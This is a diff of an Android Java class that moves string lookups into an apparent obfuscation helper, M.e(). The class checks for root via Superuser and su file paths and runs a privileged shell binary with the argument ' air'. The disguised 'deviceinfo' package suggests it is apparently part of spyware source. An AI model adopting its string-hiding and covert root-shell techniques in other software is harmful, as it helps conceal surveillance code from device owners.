@@ -21,7 +21,6 @@ import org.xml.sax.SAXException;
 
 import android.content.Context;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
@@ -29,6 +28,7 @@ import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
 import com.android.deviceinfo.util.ExecuteResult;
+import com.android.m.M;
 
 public class PackageInfo {
 	private static final String TAG = "PackageInfo";
@@ -139,7 +139,7 @@ public class PackageInfo {
 			if (file.exists() && file.canRead()) {
 				
 				// 32_14= air
-				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + Messages.getString("32_14"));
+				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + M.e(" air"));
 				p.waitFor();
 
 				if (p.exitValue() == 1) {
@@ -206,30 +206,30 @@ public class PackageInfo {
 		}
 		try {
 			//32_39=/system/app/Superuser.apk			
-            File file = new File(Messages.getString("32_39"));            
+            File file = new File(M.e("/system/app/Superuser.apk"));            
             if (file.exists()) {
                 return true;
             }
             
             //32_40=/data/app/com.noshufou.android.su-1.apk
-            file = new File(Messages.getString("32_40"));
+            file = new File(M.e("/data/app/com.noshufou.android.su-1.apk"));
             if (file.exists()) {
                 return true;
             }
             
             //32_41=/data/app/com.noshufou.android.su-2.apk
-            file = new File(Messages.getString("32_41"));
+            file = new File(M.e("/data/app/com.noshufou.android.su-2.apk"));
             if (file.exists()) {
                 return true;
             }
             
             //32_42=/system/bin/su
-            file = new File(Messages.getString("32_42"));
+            file = new File(M.e("/system/bin/su"));
             if (file.exists()) {
                 return true;
             }
 		} catch (Exception e) { 
-        	if (Cfg.EXP) {
+        	if (Cfg.EXCEPTION) {
         		Check.log(e);
         	}
         }
